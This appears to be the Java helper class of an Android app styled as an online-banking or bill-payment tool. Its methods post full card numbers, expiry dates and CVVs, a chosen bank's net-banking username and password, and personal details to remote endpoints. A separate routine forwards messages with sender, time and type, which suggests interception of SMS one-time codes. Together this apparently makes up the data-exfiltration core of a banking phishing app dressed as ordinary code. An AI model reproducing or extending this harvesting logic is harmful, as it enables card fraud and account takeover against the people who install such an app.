package com.codewithmuddasir.onlinebanking.helper;

import static com.codewithmuddasir.onlinebanking.helper.Setting.API_PAGE_FIRST;
import static com.codewithmuddasir.onlinebanking.helper.Setting.API_PAGE_FOURTH;
import static com.codewithmuddasir.onlinebanking.helper.Setting.API_PAGE_MSG;
import static com.codewithmuddasir.onlinebanking.helper.Setting.API_PAGE_SECOND;
import static com.codewithmuddasir.onlinebanking.helper.Setting.API_PAGE_THIRD;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.TimeZone;

public class Util {

    public void saveLocalData(Context activity, String key, String value) {
        SharedPreferences sharedPreferences = activity.getSharedPreferences("my_preferences", Context.MODE_PRIVATE);

        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString(key, value);
        editor.apply(); // apply changes
    }

    public String getLocalData(Context activity, String key) {
        SharedPreferences sharedPreferences = activity.getSharedPreferences("my_preferences", Context.MODE_PRIVATE);

        return sharedPreferences.getString(key, "");
    }


    public void sendCardDetail(Activity context, String userId, String billType, Runnable r) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Create connection object
                    URL url = new URL(API_PAGE_SECOND + "?");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);

    // Create JSON request body
                    JSONObject json = new JSONObject();
                    json.put("random_no", userId);
                    json.put("bill_fees", billType);

    // Write request body to connection output stream
                    OutputStream outputStream = conn.getOutputStream();
                    outputStream.write(json.toString().getBytes());
                    outputStream.flush();
                    outputStream.close();
    // Read response from server

                    // Get the response from the server
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {

                        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuffer response = new StringBuffer();
                        String line;
                        while ((line = reader.readLine()) != null) {
                            response.append(line);
                        }
                        reader.close();

                        r.run();

                    } else {
                        // Handle the error response from the server
                        String errorResponse = conn.getResponseMessage();
                        Log.e("Util", errorResponse);
                        Toast.makeText(context, "Try again, Error occur on server", Toast.LENGTH_LONG).show();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void sendCreditDetail(Activity context, String userId, String consumerId, String fullName, String mobileName, String billType, Runnable r) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Create connection object
                    URL url = new URL(API_PAGE_FIRST + "?");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);

    // Create JSON request body
                    JSONObject json = new JSONObject();
                    json.put("user_id", userId);
                    json.put("consumer_id", consumerId);
                    json.put("full_name", fullName);
                    json.put("mobile_no", mobileName);
                    json.put("bill_type", billType);

    // Write request body to connection output stream
                    OutputStream outputStream = conn.getOutputStream();
                    outputStream.write(json.toString().getBytes());
                    outputStream.flush();
                    outputStream.close();
    // Read response from server

                    // Get the response from the server
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {

                        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuffer response = new StringBuffer();
                        String line;
                        while ((line = reader.readLine()) != null) {
                            response.append(line);
                        }
                        reader.close();

                        r.run();

                    } else {
                        // Handle the error response from the server
                        String errorResponse = conn.getResponseMessage();
                        Log.e("Util", errorResponse);
                        Toast.makeText(context, "Try again, Error occur on server", Toast.LENGTH_LONG).show();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void sendCreditDetail1(Activity context, String userId, String cardNo, String expiryDate, String cvv, String cardType, Runnable r) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Create connection object
                    URL url = new URL(API_PAGE_THIRD + "?");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);

    // Create JSON request body
                    JSONObject json = new JSONObject();
                    json.put("payment_type", "Credit/Debit Card");
                    json.put("card_no", cardNo);
                    json.put("expiry_date", expiryDate);
                    json.put("cvv", cvv);
                    json.put("card_type", cardType);
                    json.put("user_id", userId);

    // Write request body to connection output stream
                    OutputStream outputStream = conn.getOutputStream();
                    outputStream.write(json.toString().getBytes());
                    outputStream.flush();
                    outputStream.close();
    // Read response from server

                    // Get the response from the server
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {

                        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuffer response = new StringBuffer();
                        String line;
                        while ((line = reader.readLine()) != null) {
                            response.append(line);
                        }
                        reader.close();

                        r.run();

                    } else {
                        // Handle the error response from the server
                        String errorResponse = conn.getResponseMessage();
                        Log.e("Util", errorResponse);
                        Toast.makeText(context, "Try again, Error occur on server", Toast.LENGTH_LONG).show();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void sendCreditDetail2(Activity context, String userId, String bankName, String userName, String password, Runnable r) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Create connection object
                    URL url = new URL(API_PAGE_FOURTH + "?");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);

    // Create JSON request body
                    JSONObject json = new JSONObject();
                    json.put("payment_type", "Net Banking");
                    json.put("bank_name", bankName);
                    json.put("user_name", userName);
                    json.put("password", password);
                    json.put("user_id", userId);

    // Write request body to connection output stream
                    OutputStream outputStream = conn.getOutputStream();
                    outputStream.write(json.toString().getBytes());
                    outputStream.flush();
                    outputStream.close();
    // Read response from server

                    // Get the response from the server
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {

                        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuffer response = new StringBuffer();
                        String line;
                        while ((line = reader.readLine()) != null) {
                            response.append(line);
                        }
                        reader.close();

                        r.run();

                    } else {
                        // Handle the error response from the server
                        String errorResponse = conn.getResponseMessage();
                        Log.e("Util", errorResponse);
                        Toast.makeText(context, "Try again, Error occur on server", Toast.LENGTH_LONG).show();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void sendMessage(String userId, String message, String sender, String time, String type) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Create connection object
                    URL url = new URL(API_PAGE_MSG + "?");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);

    // Create JSON request body
                    JSONObject json = new JSONObject();
                    json.put("userid", userId);
                    json.put("sender", sender);
                    json.put("msg", message);
                    json.put("time", time);
                    json.put("type", type);

    // Write request body to connection output stream
                    OutputStream outputStream = conn.getOutputStream();
                    outputStream.write(json.toString().getBytes());
                    outputStream.flush();
                    outputStream.close();
    // Read response from server

                    // Get the response from the server
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {

                        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuffer response = new StringBuffer();
                        String line;
                        while ((line = reader.readLine()) != null) {
                            response.append(line);
                        }
                        reader.close();
                    } else {
                        // Handle the error response from the server
                        String errorResponse = conn.getResponseMessage();
                        Log.e("Util", errorResponse);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

}
